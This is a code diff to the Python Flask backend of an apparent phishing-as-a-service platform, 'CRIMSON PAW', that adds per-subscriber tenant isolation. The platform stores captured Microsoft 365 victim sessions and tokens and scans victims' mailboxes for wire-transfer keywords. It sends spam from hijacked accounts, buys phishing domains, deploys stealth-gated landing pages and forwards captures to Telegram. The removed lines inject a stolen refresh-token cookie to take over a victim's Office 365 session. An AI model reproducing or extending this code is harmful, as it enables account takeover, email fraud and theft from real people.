-    console.log('%c[CRIMSON PAW] ✓ Cookie set via cookieStore', 'color:#3fb950;font-weight:bold');
-  }} else {{
-    document.cookie = 'x-ms-RefreshTokenCredential=' + cookieVal +
-      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none';
-    console.log('%c[CRIMSON PAW] ✓ Cookie set via document.cookie', 'color:#3fb950;font-weight:bold');
-  }}
-
-  // 4. Navigate directly into Microsoft 365 portal to complete SSO
-  console.log('%c[CRIMSON PAW] ✓ Cookie set. Redirecting to Office 365...', 'color:#22c55e;font-weight:bold');
-  window.location.href = 'https://www.office.com/?auth=2';
 }})();'''
 
     resp = jsonify({
@@ -16414,6 +18433,9 @@ def export_session_route(user_code):
     s = db.get_session_by_user_code(user_code)
     if not s:
         return jsonify({'error': 'Session not found'}), 404
+    guard = _client_session_guard(s)
+    if guard:
+        return guard
         
     victim_path = os.path.join(VICTIMS_DIR, user_code)
     auth_file = os.path.join(victim_path, '.roadtools_auth')
@@ -16441,6 +18463,21 @@ def export_session_route(user_code):
 
 @app.route('/api/sessions/<user_code>', methods=['DELETE'])
 def delete_session_route(user_code):
+    # Verify authorization
+    if not session.get('authenticated'):
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    target_session = db.get_session_by_user_code(user_code)
+    if not target_session:
+        return jsonify({'error': 'Session not found'}), 404
+
+    # If client subscriber, ensure they own this session before allowing deletion
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        if target_session.get('owner_id') != cid:
+            logger.warning(f"[SECURITY] Client {cid} attempted to delete unowned session {user_code}")
+            return jsonify({'error': 'Forbidden: You do not have permission to delete this session.'}), 403
+
     db.delete_session(user_code)
     victim_path = os.path.join(VICTIMS_DIR, user_code)
     if os.path.exists(victim_path):
@@ -16449,19 +18486,24 @@ def delete_session_route(user_code):
 
 @app.route('/api/notifications', methods=['GET'])
 def api_get_notifications():
-    """Aggregate real platform event notifications (captured sessions and keyword alerts)."""
+    """Aggregate real platform event notifications (captured sessions and keyword alerts) partitioned by tenant."""
     conn = sqlite3.connect(Config.DB_PATH)
     conn.row_factory = sqlite3.Row
     c = conn.cursor()
     notifs = []
 
+    # Scope notifications: Master Admin sees all; Client Subscriber sees only their own
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+
     # 1. Real captured victim sessions (last 5)
     c.execute("""
-        SELECT victim_name, victim_email, user_code, completed_at, created_at 
+        SELECT victim_name, victim_email, user_code, completed_at, created_at, owner_id 
         FROM sessions 
-        WHERE status = 'CAPTURED' AND (victim_name IS NOT NULL OR victim_email IS NOT NULL)
+        WHERE status = 'CAPTURED' 
+          AND (victim_name IS NOT NULL OR victim_email IS NOT NULL)
+          AND ((? IS NULL AND owner_id IS NULL) OR owner_id = ?)
         ORDER BY id DESC LIMIT 5
-    """)
+    """, (owner_id, owner_id))
     for row in c.fetchall():
         vname = row['victim_name'] or 'Victim'
         vemail = row['victim_email'] or row['user_code']
@@ -16480,8 +18522,10 @@ def api_get_notifications():
         SELECT km.id, km.matched_keyword, km.victim_name, km.victim_email, km.created_at, kr.name as rule_name
         FROM keyword_matches km
         LEFT JOIN keyword_rules kr ON km.rule_id = kr.id
+        LEFT JOIN sessions s ON km.session_user_code = s.user_code
+        WHERE ((? IS NULL AND kr.owner_id IS NULL AND s.owner_id IS NULL) OR kr.owner_id = ? OR s.owner_id = ?)
         ORDER BY km.id DESC LIMIT 5
-    """)
+    """, (owner_id, owner_id, owner_id))
     for row in c.fetchall():
         kw = row['matched_keyword']
         rname = row['rule_name'] or 'Keyword Rule'
@@ -16504,32 +18548,52 @@ def api_get_notifications():
 
 @app.route('/api/sessions/all', methods=['DELETE'])
 def delete_all_route():
-    db.delete_all_sessions()
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+    db.delete_all_sessions(owner_id=owner_id)
     if os.path.exists(VICTIMS_DIR):
-        for item in os.listdir(VICTIMS_DIR):
-            item_path = os.path.join(VICTIMS_DIR, item)
-            if os.path.isdir(item_path):
-                shutil.rmtree(item_path, ignore_errors=True)
+        if owner_id is not None:
+            # Tenant-scoped cleanup: clients purge only their own victim artifact dirs
+            owned_codes = {s.get('user_code') for s in db.get_all_sessions(owner_id=owner_id)}
+            for item in os.listdir(VICTIMS_DIR):
+                if item in owned_codes:
+                    item_path = os.path.join(VICTIMS_DIR, item)
+                    if os.path.isdir(item_path):
+                        shutil.rmtree(item_path, ignore_errors=True)
+        else:
+            for item in os.listdir(VICTIMS_DIR):
+                item_path = os.path.join(VICTIMS_DIR, item)
+                if os.path.isdir(item_path):
+                    shutil.rmtree(item_path, ignore_errors=True)
     return jsonify({'success': True})
 
 @app.route('/api/statistics', methods=['GET'])
-def get_statistics(): return jsonify(db.get_statistics())
+def get_statistics():
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+    return jsonify(db.get_statistics(owner_id=owner_id))
 
 @app.route('/api/statistics/reset', methods=['POST'])
 def reset_statistics_route():
     if not session.get('authenticated'):
         return jsonify({'success': False, 'error': 'Unauthorized'}), 401
-    if session.get('role') != 'admin':
+    # Tenant-scoped reset: subscribers wipe only their own telemetry, and the
+    # master admin's reset never touches client tenant hit data.
+    if session.get('is_client_admin'):
+        owner_id = session.get('client_id')
+    elif session.get('role') == 'admin':
+        owner_id = None
+    else:
         return jsonify({'success': False, 'error': 'Administrative privileges required.'}), 403
-    ok = db.reset_visitor_statistics()
+    ok = db.reset_visitor_statistics(owner_id=owner_id)
     return jsonify({
         'success': ok,
         'message': 'Visitor telemetry statistics reset to zero successfully.',
-        'stats': db.get_statistics()
+        'stats': db.get_statistics(owner_id=owner_id)
     })
 
 @app.route('/api/templates', methods=['GET'])
-def get_templates(): return jsonify(db.get_templates())
+def get_templates():
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+    return jsonify(db.get_templates(owner_id=owner_id))
 
 # ── Resilient Mailbox State & Demo Fallback ───────────────────
 MAILBOX_CACHE = {}
@@ -17710,7 +19774,8 @@ import deployments as _dep
 # ─── Pre-land templates ──────────────────────────────────────────────────────
 @app.route('/api/lg/preland_templates', methods=['GET'])
 def lg_get_preland_templates():
-    return jsonify(_dep.get_preland_templates())
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+    return jsonify(_dep.get_preland_templates(owner_id=owner_id))
 
 @app.route('/api/lg/preland_templates/<int:tid>', methods=['GET'])
 def lg_get_preland_template(tid):
@@ -17772,12 +19837,14 @@ def lg_preview_success():
 @app.route('/api/keyword_alerts/stats')
 def api_keyword_alerts_stats():
     """Return live summary counts for keyword rules and detected hits."""
-    stats = db.get_keyword_stats()
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+    stats = db.get_keyword_stats(owner_id=owner_id)
     return jsonify(stats)
 
 @app.route('/api/keyword_alerts/rules', methods=['GET', 'POST'])
 def api_keyword_alerts_rules():
     """List or create keyword alert rules."""
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
     if request.method == 'POST':
         d = request.json or {}
         name = d.get('name', '').strip()
@@ -17797,11 +19864,12 @@ def api_keyword_alerts_rules():
         new_id = db.add_keyword_rule(
             name=name, category=category, severity=severity, keywords=keywords,
             search_scope=search_scope, target_account=target_account,
-            notify_telegram=notify_telegram, notify_webhook=notify_webhook, is_active=is_active
+            notify_telegram=notify_telegram, notify_webhook=notify_webhook, is_active=is_active,
+            owner_id=owner_id
         )
         return jsonify({'status': 'ok', 'id': new_id, 'message': 'Rule created successfully'})
     
-    rules = db.get_keyword_rules()
+    rules = db.get_keyword_rules(owner_id=owner_id)
     return jsonify({'status': 'ok', 'rules': rules})
 
 @app.route('/api/keyword_alerts/rules/<int:rule_id>', methods=['GET', 'PUT', 'DELETE'])
@@ -17844,6 +19912,7 @@ def api_keyword_alerts_rule_toggle(rule_id):
 @app.route('/api/keyword_alerts/matches', methods=['GET'])
 def api_keyword_alerts_matches():
     """Retrieve filtered list of detected keyword hits."""
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
     severity = request.args.get('severity')
     account = request.args.get('account')
     rule_id = request.args.get('rule_id', type=int)
@@ -17853,13 +19922,16 @@ def api_keyword_alerts_matches():
     
     matches = db.get_keyword_matches(
         severity=severity, target_account=account,
-        rule_id=rule_id, triaged=triaged, limit=limit, offset=offset
+        rule_id=rule_id, triaged=triaged, limit=limit, offset=offset,
+        owner_id=owner_id
     )
     return jsonify({'status': 'ok', 'matches': matches})
 
 @app.route('/api/keyword_alerts/matches/<int:match_id>/triage', methods=['POST'])
 def api_keyword_alerts_match_triage(match_id):
     """Mark a match as triaged (reviewed)."""
+    if session.get('is_client_admin') and not db.is_keyword_match_visible_to_client(session.get('client_id'), match_id):
+        return jsonify({'error': 'Forbidden: Match belongs to another tenant.'}), 403
     d = request.json or {}
     is_triaged = 1 if d.get('is_triaged', True) else 0
     db.triage_keyword_match(match_id, is_triaged)
@@ -17868,14 +19940,18 @@ def api_keyword_alerts_match_triage(match_id):
 @app.route('/api/keyword_alerts/matches/<int:match_id>', methods=['DELETE'])
 def api_keyword_alerts_match_delete(match_id):
     """Delete a single match record."""
+    if session.get('is_client_admin') and not db.is_keyword_match_visible_to_client(session.get('client_id'), match_id):
+        return jsonify({'error': 'Forbidden: Match belongs to another tenant.'}), 403
     db.delete_keyword_match(match_id)
     return jsonify({'status': 'ok'})
 
 @app.route('/api/keyword_alerts/matches/clear', methods=['POST'])
 def api_keyword_alerts_matches_clear():
     """Clear all keyword matches from database."""
-    db.clear_keyword_matches()
-    return jsonify({'status': 'ok', 'message': 'All matches cleared'})
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
+    db.clear_keyword_matches(owner_id=owner_id)
+    scope = 'your tenant\'s' if owner_id is not None else 'all'
+    return jsonify({'status': 'ok', 'message': f'All {scope} matches cleared'})
 
 @app.route('/api/keyword_alerts/scan_now', methods=['POST'])
 def api_keyword_alerts_scan_now():
@@ -17945,8 +20021,9 @@ def api_keyword_alerts_test_telegram():
     if not chat_id:
         return jsonify({'success': False, 'message': 'Chat ID is required. Please enter your Telegram numerical user or group ID.'}), 400
 
+    brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
     test_html = (
-        "🚨 <b>CRIMSON PAW KEYWORD ALERT — BOT TEST</b> 🚨\n"
+        f"🚨 <b>{brand_name} KEYWORD ALERT — BOT TEST</b> 🚨\n"
         "👤 <b>Victim:</b> Lizbeth Lozoya\n"
         "📧 <b>Account:</b> <code>llozoya@solomon-arieh.com</code>\n"
         "🎯 <b>Matched:</b> <code>WIRE TRANSFER</code> (CRITICAL)\n"
@@ -17955,7 +20032,7 @@ def api_keyword_alerts_test_telegram():
         "📩 <b>From:</b> accounting@external-partner.com\n"
         "💬 <b>Snippet:</b> <i>\"...please redirect the wire transfer of $84,500 to our newly updated routing number and bank account...\"</i>\n"
         "🔑 <b>Session:</b> <code>DVWRHR76J</code>\n\n"
-        "✅ <b>Status:</b> <i>Dedicated Keyword Alerts Telegram Bot is active and verified!</i>"
+        f"✅ <b>Status:</b> <i>Dedicated {brand_name} Keyword Alerts Bot is active and verified!</i>"
     )
 
     ok, msg = keyword_watcher.send_keyword_telegram_message(bot_token, chat_id, test_html)
@@ -18094,7 +20171,9 @@ def preview_success_direct():
 # ─── Owned domains ──────────────────────────────────────────────────────────
 @app.route('/api/lg/domains', methods=['GET'])
 def lg_get_domains():
-    return jsonify(_dep.get_owned_domains())
+    if session.get('is_client_admin'):
+        return jsonify(_dep.get_owned_domains(owner_id=session.get('client_id')))
+    return jsonify(_dep.get_owned_domains(owner_id=None))
 
 @app.route('/api/lg/domains', methods=['POST'])
 def lg_add_domain():
@@ -18103,16 +20182,80 @@ def lg_add_domain():
     if not domain:
         return jsonify({'error':'domain required'}), 400
     domain = re.sub(r'^https?://', '', domain, flags=re.IGNORECASE).rstrip('/').strip().lower()
-    _dep.add_owned_domain(domain, d.get('registrar','manual'), d.get('expiry_date'))
+    if session.get('is_client_admin'):
+        # Bring Your Own Domain: the domain becomes the tenant's private property.
+        _dep.add_owned_domain(domain, d.get('registrar','manual'), d.get('expiry_date'),
+                              owner_id=session.get('client_id'))
+    else:
+        # Master add: a private master domain, or a marketplace listing with a price.
+        _dep.add_owned_domain(domain, d.get('registrar','manual'), d.get('expiry_date'),
+                              owner_id=None, for_sale=bool(d.get('for_sale')), price=d.get('price'))
+    return jsonify({'success': True, 'domain': domain})
+
+@app.route('/api/lg/marketplace', methods=['GET'])
+def lg_get_marketplace():
+    """Marketplace inventory — subscribers browse domains the master listed for sale."""
+    rows = _dep.get_marketplace_domains()
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        for r in rows:
+            r['pending_mine'] = bool(r.get('pending_client_id')) and r.get('pending_client_id') == cid
+            r.pop('pending_buyer', None)  # buyer identity is master-only
+    else:
+        for r in rows:
+            r['pending_mine'] = False
+    return jsonify(rows)
+
+@app.route('/api/lg/marketplace/<path:domain>/request', methods=['POST'])
+def lg_request_marketplace_domain(domain):
+    """Subscriber requests a marketplace domain: flags it pending for master review
+    and returns the Telegram deep-link where payment is completed."""
+    if not session.get('is_client_admin'):
+        return jsonify({'error': 'Subscriber access required.'}), 403
+    import urllib.parse
+    client_id = session.get('client_id')
+    ok = _dep.request_marketplace_domain(domain, client_id)
+    if not ok:
+        return jsonify({'error': 'Domain not available in the marketplace or already requested.'}), 404
+    contact = _dep.get_marketplace_telegram_contact().lstrip('@')
+    buyer = session.get('admin_user') or 'subscriber'
+    tg_url = ''
+    if contact:
+        msg = f"Marketplace purchase request: {domain} — buyer: {buyer} (client #{client_id})"
+        tg_url = f"https://t.me/{contact}?text={urllib.parse.quote(msg)}"
+    return jsonify({'success': True, 'domain': domain, 'telegram_url': tg_url})
+
+@app.route('/api/lg/marketplace/<path:domain>/list', methods=['POST'])
+def lg_list_marketplace_domain(domain):
+    """Master lists one of his own domains (or new stock) in the marketplace with a price."""
+    if not is_session_master_admin():
+        return jsonify({'error': 'Master administrator access required.'}), 403
+    price = (request.json or {}).get('price')
+    _dep.add_owned_domain(domain, (request.json or {}).get('registrar', 'manual'), None,
+                          owner_id=None, for_sale=True, price=price)
+    return jsonify({'success': True, 'domain': domain, 'price': price})
+
+@app.route('/api/lg/marketplace/<path:domain>/withdraw', methods=['POST'])
+def lg_withdraw_marketplace_domain(domain):
+    """Master pulls a listing out of the marketplace — it becomes his own domain again."""
+    if not is_session_master_admin():
+        return jsonify({'error': 'Master administrator access required.'}), 403
+    ok = _dep.withdraw_marketplace_domain(domain)
+    if not ok:
+        return jsonify({'error': 'Domain not found in the marketplace.'}), 404
     return jsonify({'success': True, 'domain': domain})
 
 @app.route('/api/lg/domains/<path:domain>', methods=['DELETE'])
 def lg_delete_domain(domain):
+    # Clients may retire their OWN domains; master retires master/marketplace rows.
+    owner_scope = '__all__'
+    if session.get('is_client_admin'):
+        owner_scope = session.get('client_id')
     hard = request.args.get('hard', 'false').lower() == 'true' or request.args.get('permanent', 'false').lower() == 'true'
     if hard:
-        _dep.purge_owned_domain(domain)
+        _dep.purge_owned_domain(domain, owner_id=owner_scope)
     else:
-        _dep.delete_owned_domain(domain)
+        _dep.delete_owned_domain(domain, owner_id=owner_scope)
     return jsonify({'success': True})
 
 @app.route('/api/lg/archive/batch-purge', methods=['POST'])
@@ -18121,6 +20264,17 @@ def lg_archive_batch_purge():
     data = request.json or {}
     dep_ids = data.get('deployment_ids', [])
     domain_names = data.get('domain_names', [])
+    owner_scope = '__all__'
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        owner_scope = cid
+        dep_ids = [did for did in dep_ids
+                   if (lambda dep: dep and dep.get('owner_id') == cid)(_dep.get_deployment(int(did) if str(did).isdigit() else 0))]
+        # Clients may purge their own retired domains only.
+        own_domains = {d['domain'] for d in _dep.get_deleted_domains(owner_id=cid)}
+        domain_names = [d for d in domain_names if d in own_domains]
+        if not dep_ids and not domain_names:
+            return jsonify({'error': 'Forbidden: No owned items selected.'}), 403
     for did in dep_ids:
         try:
             _dep.hard_delete_deployment(int(did))
@@ -18128,7 +20282,7 @@ def lg_archive_batch_purge():
             logger.warning(f"Error purging deployment {did}: {e}")
     for dname in domain_names:
         try:
-            _dep.purge_owned_domain(dname)
+            _dep.purge_owned_domain(dname, owner_id=owner_scope)
         except Exception as e:
             logger.warning(f"Error purging domain {dname}: {e}")
     return jsonify({'success': True, 'purged_deployments': len(dep_ids), 'purged_domains': len(domain_names)})
@@ -18136,32 +20290,64 @@ def lg_archive_batch_purge():
 @app.route('/api/lg/archive/purge-all', methods=['POST'])
 def lg_archive_purge_all():
     """Permanently clear out all deleted domains and deployments from archive."""
-    _dep.purge_all_archived()
+    owner_scope = '__all__'
+    if session.get('is_client_admin'):
+        owner_scope = session.get('client_id')
+    _dep.purge_all_archived(owner_id=owner_scope)
     return jsonify({'success': True})
 
 @app.route('/api/lg/domains/deleted', methods=['GET'])
 def lg_get_deleted_domains():
+    if session.get('is_client_admin'):
+        return jsonify(_dep.get_deleted_domains(owner_id=session.get('client_id')))
     return jsonify(_dep.get_deleted_domains())
 
 @app.route('/api/lg/domains/<path:domain>/restore', methods=['POST'])
 def lg_restore_domain(domain):
-    _dep.restore_owned_domain(domain)
+    owner_scope = '__all__'
+    if session.get('is_client_admin'):
+        owner_scope = session.get('client_id')
+    _dep.restore_owned_domain(domain, owner_id=owner_scope)
     return jsonify({'success': True, 'domain': domain})
 
 @app.route('/api/lg/domains/<path:domain>/ns', methods=['PATCH'])
 def lg_mark_ns(domain):
+    owner_scope = '__all__'
+    if session.get('is_client_admin'):
+        owner_scope = session.get('client_id')
     configured = (request.json or {}).get('ns_configured', True)
-    _dep.mark_domain_ns(domain, configured)
+    _dep.mark_domain_ns(domain, configured, owner_id=owner_scope)
     return jsonify({'success': True})
 
-# ─── Namecheap domain search / purchase ─────────────────────────────────────
+# ─── Dynadot domain search / purchase & settings ───────────────────────────
+@app.route('/api/settings/dynadot', methods=['POST'])
+def save_dynadot_setting():
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    d = request.json or {}
+    key = (d.get('dynadot_key') or '').strip()
+    Config.DYNADOT_API_KEY = key
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+    cfg['dynadot_key'] = key
+    try:
+        with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(cfg, f, indent=2)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 @app.route('/api/lg/domains/search', methods=['POST'])
 def lg_domain_search():
     d = request.json or {}
     domains = d.get('domains', [])
     if not domains:
         return jsonify({'error':'domains list required'}), 400
-    return jsonify(_dep.namecheap_search(domains))
+    return jsonify(_dep.dynadot_search(domains))
 
 @app.route('/api/lg/domains/suggest', methods=['POST'])
 def lg_domain_suggest():
@@ -18170,7 +20356,7 @@ def lg_domain_suggest():
     tlds    = d.get('tlds', ['com','net','org','io','co','info','xyz','app'])
     if not keyword:
         return jsonify({'error':'keyword required'}), 400
-    return jsonify(_dep.namecheap_suggest(keyword, tlds))
+    return jsonify(_dep.dynadot_suggest(keyword, tlds))
 
 @app.route('/api/lg/domains/purchase', methods=['POST'])
 def lg_domain_purchase():
@@ -18181,7 +20367,7 @@ def lg_domain_purchase():
     registrant = d.get('registrant', {})
     if not sld or not tld:
         return jsonify({'error':'sld and tld required'}), 400
-    result = _dep.namecheap_purchase(sld, tld, years, registrant)
+    result = _dep.dynadot_purchase(sld, tld, years, registrant)
     return jsonify(result)
 
 # ─── Deployments CRUD ────────────────────────────────────────────────────────
@@ -18190,17 +20376,35 @@ def lg_list_deployments():
     only_deleted = request.args.get('only_deleted', 'false').lower() == 'true'
     include_deleted = request.args.get('deleted','false').lower() == 'true' or only_deleted
     deps = _dep.get_deployments(include_deleted=include_deleted, only_deleted=only_deleted)
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        deps = [d for d in deps if d.get('owner_id') == cid]
+    else:
+        # Master partition: the admin console lists ONLY master-owned (unowned) links.
+        # Client tenant links are never mixed into the master list — pass ?tenant=<id>
+        # (master session required) to inspect a specific tenant's deployments.
+        tenant = request.args.get('tenant', type=int)
+        if tenant:
+            deps = [d for d in deps if d.get('owner_id') == tenant]
+        else:
+            deps = [d for d in deps if not d.get('owner_id')]
     # Include a fresh operator test token so the frontend Test button can bypass the stealth gate
     return jsonify({'deployments': deps, '_op_tok': generate_op_test_token()})
 
 @app.route('/api/lg/deployments', methods=['POST'])
 def lg_create_deployment():
     data = request.json or {}
-    domain = (data.get('domain') or '').strip()
-    # Do NOT auto-inject the VPS/admin panel host as the deployment domain.
-    # The domain must be explicitly provided by the operator from registered domains.
+    domain = (data.get('domain') or '').strip().lower()
     if not domain:
         return jsonify({'error':'domain is required – please select or register a deployment domain'}), 400
+    
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        data['owner_id'] = cid
+        assigned = db.get_client_assigned_domains(cid)
+        if domain not in assigned:
+            return jsonify({'error': f'Domain "{domain}" is not allocated to your account. Please order domain from Administrator.'}), 403
+
     did = _dep.create_deployment(data)
     dep = _dep.get_deployment(did)
     return jsonify(dep), 201
@@ -18232,6 +20436,12 @@ def lg_batch_delete_deployments():
     hard = data.get('hard', False)
     if not isinstance(ids, list):
         return jsonify({'error': 'ids must be a list'}), 400
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        ids = [did for did in ids
+               if (lambda dep: dep and dep.get('owner_id') == cid)(_dep.get_deployment(int(did) if str(did).isdigit() else 0))]
+        if not ids:
+            return jsonify({'error': 'Forbidden: No owned deployments selected.'}), 403
     for did in ids:
         try:
             if hard:
@@ -18277,6 +20487,12 @@ def lg_batch_kill_deployments():
     ids = data.get('ids', [])
     if not isinstance(ids, list):
         return jsonify({'error': 'ids must be a list'}), 400
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        ids = [did for did in ids
+               if (lambda dep: dep and dep.get('owner_id') == cid)(_dep.get_deployment(int(did) if str(did).isdigit() else 0))]
+        if not ids:
+            return jsonify({'error': 'Forbidden: No owned deployments selected.'}), 403
     for did in ids:
         try:
             _dep.kill_deployment(int(did))
@@ -18388,6 +20604,7 @@ def serve_landing(slug):
                 complete_url,
                 client_ip=visitor_ip,
                 user_agent=visitor_ua,
+                owner_id=dep.get('owner_id')
             )
     except Exception as e:
         logger.error(f'serve_landing error: {e}')
@@ -19038,6 +21255,12 @@ def b2b_send():
     if not s or s.get('status') != 'CAPTURED':
         return Response(stream_with_context(_err('Invalid or non-captured session')), mimetype='text/event-stream')
 
+    # Tenant ownership guard: subscribers may only send from their own captured accounts
+    guard = _client_session_guard(s)
+    if guard:
+        return Response(stream_with_context(_err('Forbidden: This victim session belongs to another tenant.')),
+                        mimetype='text/event-stream')
+
     token       = db.get_graph_access_token(s)
     if not token:
         return Response(stream_with_context(_err('No valid access token — token may be expired or PRT refresh failed. Try refreshing the session first.')), mimetype='text/event-stream')
@@ -19302,7 +21525,10 @@ def b2b_list_campaigns():
     import sqlite3
     conn = sqlite3.connect(Config.DB_PATH)
     conn.row_factory = sqlite3.Row
-    rows = [dict(r) for r in conn.execute('SELECT * FROM b2b_campaigns ORDER BY created_at DESC').fetchall()]
+    if session.get('is_client_admin'):
+        rows = [dict(r) for r in conn.execute('SELECT * FROM b2b_campaigns WHERE owner_id = ? ORDER BY created_at DESC', (session.get('client_id'),)).fetchall()]
+    else:
+        rows = [dict(r) for r in conn.execute('SELECT * FROM b2b_campaigns WHERE owner_id IS NULL ORDER BY created_at DESC').fetchall()]
     conn.close()
     return jsonify(rows)
 
@@ -19311,16 +21537,17 @@ def b2b_list_campaigns():
 def b2b_save_campaign():
     import sqlite3
     d = request.json or {}
+    owner_id = session.get('client_id') if session.get('is_client_admin') else None
     conn = sqlite3.connect(Config.DB_PATH)
     conn.execute('''INSERT INTO b2b_campaigns
         (name,subject_lines,link_lines,body_html,recipients,sender_user_code,
-         priority,delay_ms,subject_rotate_n,link_rotate_n,bcc_mode,save_sent)
-        VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
+         priority,delay_ms,subject_rotate_n,link_rotate_n,bcc_mode,save_sent,owner_id)
+        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)''',
         (d.get('name'), d.get('subject_lines'), d.get('link_lines'),
          d.get('body_html'), d.get('recipients'), d.get('sender_user_code'),
          d.get('priority','normal'), int(d.get('delay_ms',0)),
          int(d.get('subject_rotate_n',1)), int(d.get('link_rotate_n',1)),
-         int(d.get('bcc_mode',0)), int(d.get('save_sent',1))))
+         int(d.get('bcc_mode',0)), int(d.get('save_sent',1)), owner_id))
     conn.commit()
     conn.close()
     return jsonify({'success': True})
@@ -19332,6 +21559,9 @@ def b2b_get_campaign(cid):
     conn = sqlite3.connect(Config.DB_PATH)
     conn.row_factory = sqlite3.Row
     row = conn.execute('SELECT * FROM b2b_campaigns WHERE id=?', (cid,)).fetchone()
+    if session.get('is_client_admin') and row and row['owner_id'] != session.get('client_id'):
+        conn.close()
+        return jsonify({'error': 'Forbidden: Campaign belongs to another tenant.'}), 403
     conn.close()
     return jsonify(dict(row)) if row else (jsonify({'error': 'Not found'}), 404)
 
@@ -19340,6 +21570,11 @@ def b2b_get_campaign(cid):
 def b2b_delete_campaign(cid):
     import sqlite3
     conn = sqlite3.connect(Config.DB_PATH)
+    if session.get('is_client_admin'):
+        row = conn.execute('SELECT owner_id FROM b2b_campaigns WHERE id=?', (cid,)).fetchone()
+        if not row or row['owner_id'] != session.get('client_id'):
+            conn.close()
+            return jsonify({'error': 'Forbidden: Campaign belongs to another tenant.'}), 403
     conn.execute('DELETE FROM b2b_campaigns WHERE id=?', (cid,))
     conn.commit()
     conn.close()
@@ -19597,6 +21832,8 @@ SETTINGS_FILE = Path(__file__).parent / 'settings.json'
 
 @app.route('/api/settings', methods=['GET'])
 def get_platform_settings():
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden: Master administrator access required.'}), 403
     defaults = {
         'platform_name': 'CRIMSON PAW',
         'theme': 'crimson',
@@ -19604,15 +21841,12 @@ def get_platform_settings():
         'default_redirect': 'https://www.office.com/',
         'deploy_host': Config.DEPLOY_HOST,
         'refresh_threshold': 10,
-        'nc_user': Config.NAMECHEAP_API_USER or '',
-        'nc_key': Config.NAMECHEAP_API_KEY or '',
-        'nc_ip': Config.NAMECHEAP_CLIENT_IP or '',
-        'nc_env': 'production',
+        'dynadot_key': getattr(Config, 'DYNADOT_API_KEY', '') or '',
         'tg_bot_token': '',
         'tg_chat_id': '',
         'webhook_url': '',
         'notify_token': True,
-        'is_master_admin': bool(session.get('is_master_admin', False))
+        'is_master_admin': is_session_master_admin()
     }
     if SETTINGS_FILE.exists():
         try:
@@ -19620,7 +21854,7 @@ def get_platform_settings():
                 saved = json.load(f)
                 defaults.update(saved)
         except Exception: pass
-    defaults['is_master_admin'] = bool(session.get('is_master_admin', False))
+    defaults['is_master_admin'] = is_session_master_admin()
     return jsonify(defaults)
 
 @app.route('/api/auth/change_password', methods=['POST'])
@@ -19657,7 +21891,7 @@ def save_platform_settings():
     # Strict Master Host guard: Only Master Host can change theme or platform rebranding
     protected_keys = {'theme', 'platform_name', 'custom_logo_url'}
     if any(k in data for k in protected_keys):
-        if not session.get('is_master_admin'):
+        if not is_session_master_admin():
             return jsonify({
                 'success': False, 
                 'error': 'Forbidden: Theme and Platform Identity settings are strictly locked to the Master Host.'
@@ -19680,7 +21914,7 @@ def save_platform_settings():
 
 @app.route('/api/settings/upload-logo', methods=['POST'])
 def api_upload_logo():
-    if session.get('role') != 'admin' or not session.get('is_master_admin'):
+    if not is_session_master_admin():
         return jsonify({'success': False, 'error': 'Forbidden: Only Master Host can upload logo'}), 403
 
     if 'logo' not in request.files:
@@ -19720,26 +21954,63 @@ def html_escape(text):
     if text is None: return ''
     return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
 
-def _send_raw_alert(tg_html, wh_md, is_prt=False):
-    """Core alert dispatcher sending rich HTML to Telegram and Markdown to Webhook."""
+def _send_raw_alert(tg_html, wh_md, is_prt=False, owner_id=None):
+    """Core alert dispatcher sending rich HTML to Telegram and Markdown to Webhook.
+
+    Tenant-exclusive routing: events owned by a client subscriber (owner_id set)
+    are delivered ONLY to that subscriber's personal Telegram bot. The master
+    platform channel (bot + webhook) receives them solely when the optional
+    'master_mirror_alerts' setting is explicitly enabled — preventing client
+    capture activity from leaking into the administrator's Telegram feed."""
     try:
         cfg = {}
         if SETTINGS_FILE.exists():
             with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                 cfg = json.load(f)
 
+        dispatched_targets = set()
+
+        # 1. Dispatch to Client Subscriber's personal Telegram Bot if owner_id exists
+        if owner_id:
+            try:
+                client_user = db.get_operator(owner_id)
+                if client_user:
+                    c_bot = (client_user.get('tg_bot_token') or '').strip()
+                    c_chat = (client_user.get('tg_chat_id') or '').strip()
+                    if c_bot and c_chat:
+                        dispatched_targets.add((c_bot, c_chat))
+                        import urllib.request
+                        payload_c = json.dumps({
+                            'chat_id': c_chat,
+                            'text': tg_html,
+                            'disable_web_page_preview': True
+                        }).encode('utf-8')
+                        req_c = urllib.request.Request(
+                            f"https://api.telegram.org/bot{c_bot}/sendMessage",
+                            data=payload_c,
+                            headers={'Content-Type': 'application/json'}
+                        )
+                        urllib.request.urlopen(req_c, timeout=10)
+            except Exception as e:
+                logger.error(f"[TELEGRAM] Client subscriber alert dispatch error: {e}")
+
+        # ── Tenant-exclusive routing gate ─────────────────────────────
+        # Client-owned events stop here unless the master explicitly mirrors them.
